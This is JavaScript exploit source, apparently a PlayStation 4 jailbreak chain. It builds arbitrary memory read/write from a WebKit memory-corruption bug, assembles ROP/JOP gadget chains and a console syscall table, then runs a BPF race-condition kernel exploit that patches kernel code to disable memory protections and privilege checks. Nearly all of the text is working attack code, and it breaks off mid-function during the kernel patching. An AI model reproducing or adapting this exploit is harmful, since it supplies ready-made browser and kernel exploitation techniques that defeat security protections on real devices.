if (typeof bin != 'undefined') {
  var req0 = new XMLHttpRequest();
  req0.open('GET', bin);
  req0.responseType = "arraybuffer";
  req0.send();
}
if (sessionStorage.bin1 != null) {
  var req1 = new XMLHttpRequest();
  req1.open('GET', sessionStorage.bin1);
  req1.responseType = "arraybuffer";
  req1.send();
}
if (sessionStorage.bin2 != null) {
  var req2 = new XMLHttpRequest();
  req2.open('GET', sessionStorage.bin2);
  req2.responseType = "arraybuffer";
  req2.send();
}
function done() {
  if (typeof ShowPOP != 'undefined'){setTimeout(window.parent.pop,2400);}
  document.getElementById("kern").style.display = "none";
  document.getElementById("aHen").style.display = "none";
  document.getElementById("done").style.display = "block";
  setTimeout(function(){window.parent.Loader.style.opacity = "0";},1000);
  parent.HideLoaderBox();
  if (typeof ReactPSPlus != 'undefined'){setTimeout(parent.ShowTimeAndDate,2000);}
}	

function malloc(size) {
  var backing = new Uint8Array(0x10000 + size);
  window.nogc.push(backing);
  var ptr = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = backing;
  return ptr;
}
function mallocu32(size) {
  var backing = new Uint8Array(0x10000 + size * 4);
  window.nogc.push(backing);
  var ptr = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = new Uint32Array(backing.buffer);
  return ptr;
}
function stringify(str) {
  var bufView = new Uint8Array(str.length + 1);
  for (var i = 0; i < str.length; i++) {
    bufView[i] = str.charCodeAt(i) & 0xFF;
  }
  window.nogc.push(bufView);
  return p.read8(p.leakval(bufView).add32(0x10));
}
var krop = function (p, addr) {
  this.stackBase = addr;
  this.stackPointer = 0;
  this.push = function (val) {
    p.write8(this.stackBase.add32(this.stackPointer), val);
    this.stackPointer += 8;
  };
  this.write64 = function (addr, val) {
    this.push(window.gadgets["pop rdi"]);
    this.push(addr);
    this.push(window.gadgets["pop rax"]);
    this.push(val);
    this.push(window.gadgets["mov [rdi], rax"]);
  }
  return this;
};
window.rop = function () {
  this.stack = new Uint32Array(0x10000);
  this.stackBase = p.read8(p.leakval(this.stack).add32(0x10));
  this.count = 0;
  this.clear = function () {
    this.count = 0;
    this.runtime = undefined;
    for (var i = 0; i < 0xFF0 / 2; i++) {
      p.write8(this.stackBase.add32(i * 8), 0);
    }
  };
  this.pushSymbolic = function () {
    this.count++;
    return this.count - 1;
  }
  this.finalizeSymbolic = function (idx, val) {
    p.write8(this.stackBase.add32(idx * 8), val);
  }
  this.push = function (val) {
    this.finalizeSymbolic(this.pushSymbolic(), val);
  }
  this.push_write8 = function (where, what) {
    this.push(gadgets["pop rdi"]);
    this.push(where);
    this.push(gadgets["pop rsi"]);
    this.push(what);
    this.push(gadgets["mov [rdi], rsi"]);
  }
  this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]);
      this.push(rdi);
    }
    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]);
      this.push(rsi);
    }
    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]);
      this.push(rdx);
    }
    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]);
      this.push(rcx);
    }
    if (r8 != undefined) {
      this.push(gadgets["pop r8"]);
      this.push(r8);
    }
    if (r9 != undefined) {
      this.push(gadgets["pop r9"]);
      this.push(r9);
    }
    this.push(rip);
    return this;
  }
  this.run = function () {
    var retv = p.loadchain(this, this.notimes);
    this.clear();
    return retv;
  }
  return this;
};
window.nameforsyscall = swapkeyval(window.syscallnames);
window.syscalls = {};
function swapkeyval(json) {
  var ret = {};
  for (var key in json) {
    if (json.hasOwnProperty(key)) {
      ret[json[key]] = key;
    }
  }
  return ret;
}
window.syscallnames = {
  "sys_exit": 1,
  "sys_fork": 2,
  "sys_read": 3,
  "sys_write": 4,
  "sys_open": 5,
  "sys_close": 6,
  "sys_wait4": 7,
  "sys_unlink": 10,
  "sys_chdir": 12,
  "sys_chmod": 15,
  "sys_getpid": 20,
  "sys_setuid": 23,
  "sys_getuid": 24,
  "sys_geteuid": 25,
  "sys_recvmsg": 27,
  "sys_sendmsg": 28,
  "sys_recvfrom": 29,
  "sys_accept": 30,
  "sys_getpeername": 31,
  "sys_getsockname": 32,
  "sys_access": 33,
  "sys_chflags": 34,
  "sys_fchflags": 35,
  "sys_sync": 36,
  "sys_kill": 37,
  "sys_stat": 38,
  "sys_getppid": 39,
  "sys_dup": 41,
  "sys_pipe": 42,
  "sys_getegid": 43,
  "sys_profil": 44,
  "sys_getgid": 47,
  "sys_getlogin": 49,
  "sys_setlogin": 50,
  "sys_sigaltstack": 53,
  "sys_ioctl": 54,
  "sys_reboot": 55,
  "sys_revoke": 56,
  "sys_execve": 59,
  "sys_msync": 65,
  "sys_munmap": 73,
  "sys_mprotect": 74,
  "sys_madvise": 75,
  "sys_mincore": 78,
  "sys_getgroups": 79,
  "sys_setgroups": 80,
  "sys_setitimer": 83,
  "sys_getitimer": 86,
  "sys_getdtablesize": 89,
  "sys_dup2": 90,
  "sys_fcntl": 92,
  "sys_select": 93,
  "sys_fsync": 95,
  "sys_setpriority": 96,
  "sys_socket": 97,
  "sys_connect": 98,
  "sys_getpriority": 100,
  "sys_send": 101,
  "sys_recv": 102,
  "sys_bind": 104,
  "sys_setsockopt": 105,
  "sys_listen": 106,
  "sys_recvmsg": 113,
  "sys_sendmsg": 114,
  "sys_gettimeofday": 116,
  "sys_getrusage": 117,
  "sys_getsockopt": 118,
  "sys_readv": 120,
  "sys_writev": 121,
  "sys_settimeofday": 122,
  "sys_fchmod": 124,
  "sys_recvfrom": 125,
  "sys_setreuid": 126,
  "sys_setregid": 127,
  "sys_rename": 128,
  "sys_flock": 131,
  "sys_sendto": 133,
  "sys_shutdown": 134,
  "sys_socketpair": 135,
  "sys_mkdir": 136,
  "sys_rmdir": 137,
  "sys_utimes": 138,
  "sys_adjtime": 140,
  "sys_getpeername": 141,
  "sys_setsid": 147,
  "sys_sysarch": 165,
  "sys_setegid": 182,
  "sys_seteuid": 183,
  "sys_fstat": 189,
  "sys_lstat": 190,
  "sys_pathconf": 191,
  "sys_fpathconf": 192,
  "sys_getrlimit": 194,
  "sys_setrlimit": 195,
  "sys_getdirentries": 196,
  "sys___sysctl": 202,
  "sys_mlock": 203,
  "sys_munlock": 204,
  "sys_futimes": 206,
  "sys_poll": 209,
  "sys_clock_gettime": 232,
  "sys_clock_settime": 233,
  "sys_clock_getres": 234,
  "sys_ktimer_create": 235,
  "sys_ktimer_delete": 236,
  "sys_ktimer_settime": 237,
  "sys_ktimer_gettime": 238,
  "sys_ktimer_getoverrun": 239,
  "sys_nanosleep": 240,
  "sys_rfork": 251,
  "sys_issetugid": 253,
  "sys_getdents": 272,
  "sys_preadv": 289,
  "sys_pwritev": 290,
  "sys_getsid": 310,
  "sys_aio_suspend": 315,
  "sys_mlockall": 324,
  "sys_munlockall": 325,
  "sys_sched_setparam": 327,
  "sys_sched_getparam": 328,
  "sys_sched_setscheduler": 329,
  "sys_sched_getscheduler": 330,
  "sys_sched_yield": 331,
  "sys_sched_get_priority_max": 332,
  "sys_sched_get_priority_min": 333,
  "sys_sched_rr_get_interval": 334,
  "sys_utrace": 335,
  "sys_sigprocmask": 340,
  "sys_sigprocmask": 340,
  "sys_sigsuspend": 341,
  "sys_sigpending": 343,
  "sys_sigtimedwait": 345,
  "sys_sigwaitinfo": 346,
  "sys_kqueue": 362,
  "sys_kevent": 363,
  "sys_uuidgen": 392,
  "sys_sendfile": 393,
  "sys_fstatfs": 397,
  "sys_ksem_close": 400,
  "sys_ksem_post": 401,
  "sys_ksem_wait": 402,
  "sys_ksem_trywait": 403,
  "sys_ksem_init": 404,
  "sys_ksem_open": 405,
  "sys_ksem_unlink": 406,
  "sys_ksem_getvalue": 407,
  "sys_ksem_destroy": 408,
  "sys_sigaction": 416,
  "sys_sigreturn": 417,
  "sys_getcontext": 421,
  "sys_setcontext": 422,
  "sys_swapcontext": 423,
  "sys_sigwait": 429,
  "sys_thr_create": 430,
  "sys_thr_exit": 431,
  "sys_thr_self": 432,
  "sys_thr_kill": 433,
  "sys_ksem_timedwait": 441,
  "sys_thr_suspend": 442,
  "sys_thr_wake": 443,
  "sys_kldunloadf": 444,
  "sys__umtx_op": 454,
  "sys__umtx_op": 454,
  "sys_thr_new": 455,
  "sys_sigqueue": 456,
  "sys_thr_set_name": 464,
  "sys_rtprio_thread": 466,
  "sys_pread": 475,
  "sys_pwrite": 476,
  "sys_mmap": 477,
  "sys_lseek": 478,
  "sys_truncate": 479,
  "sys_ftruncate": 480,
  "sys_thr_kill2": 481,
  "sys_shm_open": 482,
  "sys_shm_unlink": 483,
  "sys_cpuset_getid": 486,
  "sys_cpuset_getaffinity": 487,
  "sys_cpuset_setaffinity": 488,
  "sys_openat": 499,
  "sys_pselect": 522,
  "sys_regmgr_call": 532,
  "sys_jitshm_create": 533,
  "sys_jitshm_alias": 534,
  "sys_dl_get_list": 535,
  "sys_dl_get_info": 536,
  "sys_dl_notify_event": 537,
  "sys_evf_create": 538,
  "sys_evf_delete": 539,
  "sys_evf_open": 540,
  "sys_evf_close": 541,
  "sys_evf_wait": 542,
  "sys_evf_trywait": 543,
  "sys_evf_set": 544,
  "sys_evf_clear": 545,
  "sys_evf_cancel": 546,
  "sys_query_memory_protection": 47,
  "sys_batch_map": 548,
  "sys_osem_create": 549,
  "sys_osem_delete": 550,
  "sys_osem_open": 551,
  "sys_osem_close": 552,
  "sys_osem_wait": 553,
  "sys_osem_trywait": 554,
  "sys_osem_post": 555,
  "sys_osem_cancel": 556,
  "sys_namedobj_create": 557,
  "sys_namedobj_delete": 558,
  "sys_set_vm_container": 559,
  "sys_debug_init": 560,
  "sys_suspend_process": 561,
  "sys_resume_process": 562,
  "sys_opmc_enable": 563,
  "sys_opmc_disable": 564,
  "sys_opmc_set_ctl": 565,
  "sys_opmc_set_ctr": 566,
  "sys_opmc_get_ctr": 567,
  "sys_budget_create": 568,
  "sys_budget_delete": 569,
  "sys_budget_get": 570,
  "sys_budget_set": 571,
  "sys_virtual_query": 572,
  "sys_mdbg_call": 573,
  "sys_sblock_create": 574,
  "sys_sblock_delete": 575,
  "sys_sblock_enter": 576,
  "sys_sblock_exit": 577,
  "sys_sblock_xenter": 578,
  "sys_sblock_xexit": 579,
  "sys_eport_create": 580,
  "sys_eport_delete": 581,
  "sys_eport_trigger": 582,
  "sys_eport_open": 583,
  "sys_eport_close": 584,
  "sys_is_in_sandbox": 585,
  "sys_dmem_container": 586,
  "sys_get_authinfo": 587,
  "sys_mname": 588,
  "sys_dynlib_dlopen": 589,
  "sys_dynlib_dlclose": 590,
  "sys_dynlib_dlsym": 591,
  "sys_dynlib_get_list": 592,
  "sys_dynlib_get_info": 593,
  "sys_dynlib_load_prx": 594,
  "sys_dynlib_unload_prx": 595,
  "sys_dynlib_do_copy_relocations": 596,
  "sys_dynlib_prepare_dlclose": 597,
  "sys_dynlib_get_proc_param": 598,
  "sys_dynlib_process_needed_and_relocate": 599,
  "sys_sandbox_path": 600,
  "sys_mdbg_service": 601,
  "sys_randomized_path": 602,
  "sys_rdup": 603,
  "sys_dl_get_metadata": 604,
  "sys_workaround8849": 605,
  "sys_is_development_mode": 606,
  "sys_get_self_auth_info": 607,
  "sys_dynlib_get_info_ex": 608,
  "sys_budget_get_ptype": 610,
  "sys_budget_getid": 609,
  "sys_get_paging_stats_of_all_threads": 611,
  "sys_get_proc_type_info": 612,
  "sys_get_resident_count": 613,
  "sys_prepare_to_suspend_process": 614,
  "sys_get_resident_fmem_count": 615,
  "sys_thr_get_name": 616,
  "sys_set_gpo": 617,
  "sys_get_paging_stats_of_all_objects": 618,
  "sys_test_debug_rwmem": 619,
  "sys_free_stack": 620,
  "sys_suspend_system": 621,
  "sys_ipmimgr_call": 622,
  "sys_get_gpo": 623,
  "sys_get_vm_map_timestamp": 624,
  "sys_opmc_set_hw": 625,
  "sys_opmc_get_hw": 626,
  "sys_get_cpu_usage_all": 627,
  "sys_mmap_dmem": 628,
  "sys_physhm_open": 629,
  "sys_physhm_unlink": 630,
  "sys_resume_internal_hdd": 631,
  "sys_thr_suspend_ucontext": 632,
  "sys_thr_resume_ucontext": 633,
  "sys_thr_get_ucontext": 634,
  "sys_thr_set_ucontext": 635,
  "sys_set_timezone_info": 636,
  "sys_set_phys_fmem_limit": 637,
  "sys_utc_to_localtime": 638,
  "sys_localtime_to_utc": 639,
  "sys_set_uevt": 640,
  "sys_get_cpu_usage_proc": 641,
  "sys_get_map_statistics": 642,
  "sys_set_chicken_switches": 643,
  "sys_extend_page_table_pool": 644,
  "sys_645": 645,
  "sys_get_kernel_mem_statistics": 646,
  "sys_get_sdk_compiled_version": 647,
  "sys_app_state_change": 648,
  "sys_dynlib_get_obj_member": 649,
  "sys_budget_get_ptype_of_budget": 650,
  "sys_prepare_to_resume_process": 651,
  "sys_process_terminate": 652,
  "sys_blockpool_open": 653,
  "sys_blockpool_map": 654,
  "sys_blockpool_unmap": 655,
  "sys_dynlib_get_info_for_libdbg": 656,
  "sys_blockpool_batch": 657,
  "sys_fdatasync": 658,
  "sys_dynlib_get_list2": 659,
  "sys_dynlib_get_info2": 660,
  "sys_aio_submit": 661,
  "sys_aio_multi_delete": 662,
  "sys_aio_multi_wait": 663,
  "sys_aio_multi_poll": 664,
  "sys_aio_get_data": 655,
  "sys_aio_multi_cancel": 666,
  "sys_get_bio_usage_all": 667,
  "sys_aio_create": 668,
  "sys_aio_submit_cmd": 669,
  "sys_aio_init": 670,
  "sys_get_page_table_stats": 671,
  "sys_dynlib_get_list_for_libdbg": 672
}
function makeid() {
  var text = "";
  var possible = "ABCDFGHIJKMNOPQRSTUVWXYZLEefulabcdghijkmnopqrstvwxyz0123456789";
  for (var i = 0; i < 8; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));
  return text;
};
var instancespr = [];
for (var i = 0; i < 4096; i++) {
  instancespr[i] = new Uint32Array(1);
  instancespr[i][makeid()] = 50057;
}
var _dview;
function u2d(low, hi) {
  if (!_dview)
    _dview = new DataView(new ArrayBuffer(16));
  _dview.setUint32(0, hi);
  _dview.setUint32(4, low);
  return _dview.getFloat64(0);
}
var dgc = function () {
  for (var i = 0; i < 0x100; i++) {
    new ArrayBuffer(0x100000);
  }
}
function int64(low, hi) {
  this.low = (low >>> 0);
  this.hi = (hi >>> 0);
  this.add32inplace = function (val) {
    var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
    var new_hi = (this.hi >>> 0);
    if (new_lo < this.low) {
      new_hi++;
    }
    this.hi = new_hi;
    this.low = new_lo;
  }
  this.add32 = function (val) {
    var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
    var new_hi = (this.hi >>> 0);
    if (new_lo < this.low) {
      new_hi++;
    }
    return new int64(new_lo, new_hi);
  }
  this.sub32 = function (val) {
    var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
    var new_hi = (this.hi >>> 0);
    if (new_lo > (this.low) & 0xFFFFFFFF) {
      new_hi--;
    }
    return new int64(new_lo, new_hi);
  }
  this.sub32inplace = function (val) {
    var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
    var new_hi = (this.hi >>> 0);
    if (new_lo > (this.low) & 0xFFFFFFFF) {
      new_hi--;
    }
    this.hi = new_hi;
    this.low = new_lo;
  }
  this.and32 = function (val) {
    var new_lo = this.low & val;
    var new_hi = this.hi;
    return new int64(new_lo, new_hi);
  }
  this.and64 = function (vallo, valhi) {
    var new_lo = this.low & vallo;
    var new_hi = this.hi & valhi;
    return new int64(new_lo, new_hi);
  }
  this.toString = function (val) {
    val = 16;
    var lo_str = (this.low >>> 0).toString(val);
    var hi_str = (this.hi >>> 0).toString(val);
    if (this.hi == 0)
      return lo_str;
    else
      lo_str = zeroFill(lo_str, 8)
        return hi_str + lo_str;
  }
  this.toPacked = function () {
    return {
      hi: this.hi,
      low: this.low
    };
  }
  this.setPacked = function (pck) {
    this.hi = pck.hi;
    this.low = pck.low;
    return this;
  }
  return this;
}
function zeroFill(number, width) {
  width -= number.toString().length;
  if (width > 0) {
    return new Array(width + (/\./.test(number) ? 2 : 1)).join('0') + number;
  }
  return number + "";
}
var nogc = [];
var fail = function () {
  alert.apply(null, arguments);
  throw "fail";
}
var tgt = {
  a: 0,
  b: 0,
  c: 0,
  d: 0
}
var y = new ImageData(1, 0x4000)
  postMessage("", "*", [y.data.buffer]);
var props = {};
for (var i = 0; (i < (0x4000 / 2)); ) {
  props[i++] = {
    value: 0x42424242
  };
  props[i++] = {
    value: tgt
  };
}
var foundLeak = undefined;
var foundIndex = 0;
var maxCount = 0x100;
while (foundLeak == undefined && maxCount > 0) {
  maxCount--;
  history.pushState(y, "");
  Object.defineProperties({}, props);
  var leak = new Uint32Array(history.state.data.buffer);
  for (var i = 0; i < leak.length - 6; i++) {
    if (leak[i] == 0x42424242 && leak[i + 0x1] == 0xFFFF0000 && leak[i + 0x2] == 0x00000000 && leak[i + 0x3] == 0x00000000 && leak[i + 0x4] == 0x00000000 && leak[i + 0x5] == 0x00000000 && leak[i + 0x6] == 0x0000000E && leak[i + 0x7] == 0x00000000 && leak[i + 0xA] == 0x00000000 && leak[i + 0xB] == 0x00000000 && leak[i + 0xC] == 0x00000000 && leak[i + 0xD] == 0x00000000 && leak[i + 0xE] == 0x0000000E && leak[i + 0xF] == 0x00000000) {
      foundIndex = i;
      foundLeak = leak;
      break;
    }
  }
}
if (!foundLeak) {
  failed = true
    fail("Failed to find leak!")
}
var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 0x40);
var leakJSVal = new int64(firstLeak[8], firstLeak[9]);
Array.prototype.__defineGetter__(100, () => 1);
var f = document.body.appendChild(document.createElement('iframe'));
var a = new f.contentWindow.Array(13.37, 13.37);
var b = new f.contentWindow.Array(u2d(leakJSVal.low + 0x10, leakJSVal.hi), 13.37);
var master = new Uint32Array(0x1000);
var slave = new Uint32Array(0x1000);
var leakval_u32 = new Uint32Array(0x1000);
var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
tgt.a = u2d(2048, 0x1602300);
tgt.b = 0;
tgt.c = leakval_helper;
tgt.d = 0x1337;
var c = Array.prototype.concat.call(a, b);
document.body.removeChild(f);
var hax = c[0];
c[0] = 0;
tgt.c = c;
hax[2] = 0;
hax[3] = 0;
Object.defineProperty(Array.prototype, 100, {
  get: undefined
});
tgt.c = leakval_helper;
var butterfly = new int64(hax[2], hax[3]);
butterfly.low += 0x10;
tgt.c = leakval_u32;
var lkv_u32_old = new int64(hax[4], hax[5]);
hax[4] = butterfly.low;
hax[5] = butterfly.hi;
tgt.c = master;
hax[4] = leakval_u32[0];
hax[5] = leakval_u32[1];
var addr_to_slavebuf = new int64(master[4], master[5]);
tgt.c = leakval_u32;
hax[4] = lkv_u32_old.low;
hax[5] = lkv_u32_old.hi;
tgt.c = 0;
hax = 0;
var prim = {
  write8: function (addr, val) {
    master[4] = addr.low;
    master[5] = addr.hi;
    if (val instanceof int64) {
      slave[0] = val.low;
      slave[1] = val.hi;
    } else {
      slave[0] = val;
      slave[1] = 0;
    }
    master[4] = addr_to_slavebuf.low;
    master[5] = addr_to_slavebuf.hi;
  },
  write4: function (addr, val) {
    master[4] = addr.low;
    master[5] = addr.hi;
    slave[0] = val;
    master[4] = addr_to_slavebuf.low;
    master[5] = addr_to_slavebuf.hi;
  },
  read8: function (addr) {
    master[4] = addr.low;
    master[5] = addr.hi;
    var rtv = new int64(slave[0], slave[1]);
    master[4] = addr_to_slavebuf.low;
    master[5] = addr_to_slavebuf.hi;
    return rtv;
  },
  read4: function (addr) {
    master[4] = addr.low;
    master[5] = addr.hi;
    var rtv = slave[0];
    master[4] = addr_to_slavebuf.low;
    master[5] = addr_to_slavebuf.hi;
    return rtv;
  },
  leakval: function (jsval) {
    leakval_helper[0] = jsval;
    var rtv = this.read8(butterfly);
    this.write8(butterfly, new int64(0x41414141, 0xffff0000));
    return rtv;
  },
  createval: function (jsval) {
    this.write8(butterfly, jsval);
    var rt = leakval_helper[0];
    this.write8(butterfly, new int64(0x41414141, 0xffff0000));
    return rt;
  }
};
window.primitives = prim;
function kernExploit() {
  try {
    var fd = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
    if (fd == (-1 >>> 0))
      throw "Failed to open first bpf device!"
      var fd1 = p.syscall("sys_open", p.stringify("/dev/bpf0"), 2).low;
    var bpf_valid = p.malloc32(0x4000);
    var bpf_spray = p.malloc32(0x4000);
    var bpf_valid_u32 = bpf_valid.backing;
    var bpf_valid_prog = p.malloc(0x40);
    p.write8(bpf_valid_prog, 0x800 / 8)
    p.write8(bpf_valid_prog.add32(8), bpf_valid)
    var bpf_spray_prog = p.malloc(0x40);
    p.write8(bpf_spray_prog, 0x800 / 8)
    p.write8(bpf_spray_prog.add32(8), bpf_spray)
    for (var i = 0; i < 0x400; ) {
      bpf_valid_u32[i++] = 6;
      bpf_valid_u32[i++] = 0;
    }
    var rtv = p.syscall("sys_ioctl", fd, 0x8010427B, bpf_valid_prog);
    if (rtv.low != 0)
      throw "Failed to open first bpf device!";
    var spawnthread = function (name, chain) {
      var contextp = p.malloc32(0x2000);
      var contextz = contextp.backing;
      contextz[0] = 1337;
      var thread2 = new rop();
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);
      thread2.push(window.gadgets["ret"]);
      chain(thread2);
      p.write8(contextp, window.gadgets["ret"]);
      p.write8(contextp.add32(0x10), thread2.stackBase);
      p.syscall(324, 1);
      var retv = function () {
        p.fcall(window.gadgets["createThread"], window.gadgets["longjmp"], contextp, p.stringify(name));
      }
      window.nogc.push(contextp);
      window.nogc.push(thread2);
      return retv;
    }
    var interrupt1,
    loop1;
    var interrupt2,
    loop2;
    var sock = p.syscall(97, 2, 2);
    var start1 = spawnthread("GottaGoFast", function (thread2) {
        interrupt1 = thread2.stackBase;
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["ret"]);
        thread2.push(window.gadgets["pop rdi"]);
        thread2.push(fd);
        thread2.push(window.gadgets["pop rsi"]);
        thread2.push(0x8010427B);
        thread2.push(window.gadgets["pop rdx"]);
        thread2.push(bpf_valid_prog);
        thread2.push(window.gadgets["pop rsp"]);
        thread2.push(thread2.stackBase.add32(0x800));
        thread2.count = 0x100;
        var cntr = thread2.count;
        thread2.push(window.syscalls[54]);
        thread2.push_write8(thread2.stackBase.add32(cntr * 8), window.syscalls[54]);
        thread2.push(window.gadgets["pop rdi"]);
        var wherep = thread2.pushSymbolic();
        thread2.push(window.gadgets["pop rsi"]);
        var whatp = thread2.pushSymbolic();
        thread2.push(window.gadgets["mov [rdi], rsi"]);
        thread2.push(window.gadgets["pop rsp"]);
        loop1 = thread2.stackBase.add32(thread2.count * 8);
        thread2.push(0x41414141);
        thread2.finalizeSymbolic(wherep, loop1);
        thread2.finalizeSymbolic(whatp, loop1.sub32(8));
      });
    var krop = new rop();
    var kscratch = p.malloc32(0x1000);
    var ctxp = p.malloc32(0x1000);
    var ctxp1 = p.malloc32(0x1000);
    var ctxp2 = p.malloc32(0x1000);
    var kpatch = function (offset, qword) {
      krop.push(window.gadgets["pop rax"]);
      krop.push(kscratch);
      krop.push(window.gadgets["mov rax, [rax]"]);
      krop.push(window.gadgets["pop rsi"]);
      krop.push(offset);
      krop.push(window.gadgets["add rax, rsi"]);
      krop.push(window.gadgets["pop rsi"]);
      krop.push(qword);
      krop.push(window.gadgets["mov [rax], rsi"]);
    }
    var kpatch2 = function (offset, offset2) {
      krop.push(window.gadgets["pop rax"]);
      krop.push(kscratch);
      krop.push(window.gadgets["mov rax, [rax]"]);
      krop.push(window.gadgets["pop rsi"]);
      krop.push(offset);
      krop.push(window.gadgets["add rax, rsi"]);
      krop.push(window.gadgets["mov rdi, rax"]);
      krop.push(window.gadgets["pop rax"]);
      krop.push(kscratch);
      krop.push(window.gadgets["mov rax, [rax]"]);
      krop.push(window.gadgets["pop rsi"]);
      krop.push(offset2);
      krop.push(window.gadgets["add rax, rsi"]);
      krop.push(window.gadgets["mov [rdi], rax"]);
    }
    var stackshift_from_retaddr = 0;
    p.write8(bpf_spray.add32(0x10), ctxp);
    p.write8(ctxp.add32(0x50), 0);
    p.write8(ctxp.add32(0x68), ctxp1);
    p.write8(ctxp1.add32(0x10), window.gadgets["jop1"]);
    stackshift_from_retaddr += 0x8 + window.gadgets_shift["stackshift_jop1"];
    p.write8(ctxp.add32(0x00), ctxp2);
    p.write8(ctxp.add32(0x10), ctxp2.add32(0x08));
    p.write8(ctxp2.add32(0x7D0), window.gadgets["jop2"]);
    var iterbase = ctxp2;
    for (var i = 0; i < 0xF; i++) {
      p.write8(iterbase, window.gadgets["jop1"]);
      stackshift_from_retaddr += 0x8 + window.gadgets_shift["stackshift_jop1"];
      p.write8(iterbase.add32(0x7D0 + 0x20), window.gadgets["jop2"]);
      p.write8(iterbase.add32(0x08), iterbase.add32(0x20));
      p.write8(iterbase.add32(0x18), iterbase.add32(0x28));
      iterbase = iterbase.add32(0x20);
    }
    var raxbase = iterbase;
    var rdibase = iterbase.add32(0x08);
    var memcpy = get_jmptgt(webKitBase.add32(0xF8));
    memcpy = p.read8(memcpy);
    p.write8(raxbase, window.gadgets["jop3"]);
    stackshift_from_retaddr += 0x8;
    p.write8(rdibase.add32(0x70), window.gadgets["jop4"]);
    stackshift_from_retaddr += 0x8;
    p.write8(rdibase.add32(0x18), rdibase);
    p.write8(rdibase.add32(0x08), krop.stackBase);
    p.write8(raxbase.add32(0x30), window.gadgets["jop_mov rbp, rsp"]);
    p.write8(rdibase, raxbase);
    p.write8(raxbase.add32(0x420), window.gadgets["jop6"]);
    stackshift_from_retaddr += window.gadgets_shift["stackshift_jop6"];
    var topofchain = stackshift_from_retaddr;
    p.write8(raxbase.add32(0x40), memcpy.add32(0x32));
    p.write8(rdibase.add32(0xB0), topofchain);
    for (var i = 0; i < 0x1000 / 8; i++)
      p.write8(krop.stackBase.add32(i * 8), window.gadgets["ret"]);
    krop.count = 0x10;
    p.write8(kscratch.add32(0x420), window.gadgets["pop rdi"]);
    p.write8(kscratch.add32(0x40), window.gadgets["pop rax"]);
    p.write8(kscratch.add32(0x18), kscratch);
    krop.push(window.gadgets["pop rdi"]);
    krop.push(kscratch.add32(0x18));
    krop.push(window.gadgets["jop_mov rbp, rsp"]);
    var rboff = topofchain - krop.count * 8;
    krop.push(window.gadgets["jop6"]);
    rboff += window.gadgets_shift["stackshift_jop6"];
    krop.push(window.gadgets["pop rax"]);
    krop.push(rboff);
    krop.push(window.gadgets["add rdi, rax"]);
    krop.push(window.gadgets["mov rax, [rdi]"]);
    krop.push(window.gadgets["pop rsi"]);
    krop.push(0x2FA);
    krop.push(window.gadgets["add rax, rsi"]);
    krop.push(window.gadgets["mov [rdi], rax"]);
    krop.push(window.gadgets["pop rdi"]);
    krop.push(kscratch);
    krop.push(window.gadgets["mov [rdi], rax"]);
    krop.push(window.gadgets["pop rsi"]);
    krop.push(0xC54B4);
    krop.push(window.gadgets["add rax, rsi"]);
    krop.push(window.gadgets["pop rdi"]);
    krop.push(kscratch.add32(0x08));
    krop.push(window.gadgets["mov [rdi], rax"]);
    krop.push(window.gadgets["jmp rax"]);
    krop.push(window.gadgets["pop rdi"]);
    krop.push(kscratch.add32(0x10));
    krop.push(window.gadgets["mov [rdi], rax"]);
    krop.push(window.gadgets["pop rsi"]);
    krop.push(new int64(0xFFFEFFFF, 0xFFFFFFFF));
    krop.push(window.gadgets["and rax, rsi"]);
    krop.push(window.gadgets["mov rdx, rax"]);
    krop.push(window.gadgets["pop rax"]);
    krop.push(kscratch.add32(8));
    krop.push(window.gadgets["mov rax, [rax]"]);
    krop.push(window.gadgets["pop rsi"]);
    krop.push(0x9);
    krop.push(window.gadgets["add rax, rsi"]);
    krop.push(window.gadgets["mov rdi, rax"]);
    krop.push(window.gadgets["mov rax, rdx"]);
    krop.push(window.gadgets["jmp rdi"]);
    krop.push(window.gadgets["pop rax"]);
    krop.push(kscratch);
    krop.push(window.gadgets["mov rax, [rax]"]);
    krop.push(window.gadgets["pop rsi"]);
    krop.push(0x3609A);
    krop.push(window.gadgets["add rax, rsi"]);
    krop.push(window.gadgets["mov rax, [rax]"]);
    krop.push(window.gadgets["pop rdi"]);
    krop.push(kscratch.add32(0x330));
    krop.push(window.gadgets["mov [rdi], rax"]);
    patch_mprotect = new int64(0x9090FA38, 0x90909090);
    kpatch(0x3609A, patch_mprotect);
    var patch_sys_setuid_offset = new int64(0xFFEE6F06, 0xFFFFFFFF);
    var patch_sys_setuid = new int64(0x000000B8, 0xC4894100);
    kpatch(patch_sys_setuid_offset, patch_sys_setuid);
    var patch_amd64_syscall_offset1 = new int64(0xFFE92927, 0xFFFFFFFF);
    var patch_amd64_syscall_offset2 = new int64(0xFFE92945, 0xFFFFFFFF);
    var patch_amd64_syscall_1 = new int64(0x00000000, 0x40878B49);
    var patch_amd64_syscall_2 = new int64(0x90907DEB, 0x72909090);
    kpatch(patch_amd64_syscall_offset1, patch_amd64_syscall_1);
    kpatch(patch_amd64_syscall_offset2, patch_amd64_syscall_2);
    var patch_sys_mmap_offset = new int64(0xFFFCFAB4, 0xFFFFFFFF);
    var patch_sys_mmap = new int64(0x37B64037, 0x3145C031);
    kpatch(patch_sys_mmap_offset, patch_sys_mmap);
    var patch_sys_dynlib_dlsym_1 = new int64(0x0001C1E9, 0x8B489000);
    var patch_sys_dynlib_dlsym_2 = new int64(0x90C3C031, 0x90909090);
    kpatch(0xCA3CE, patch_sys_dynlib_dlsym_1);
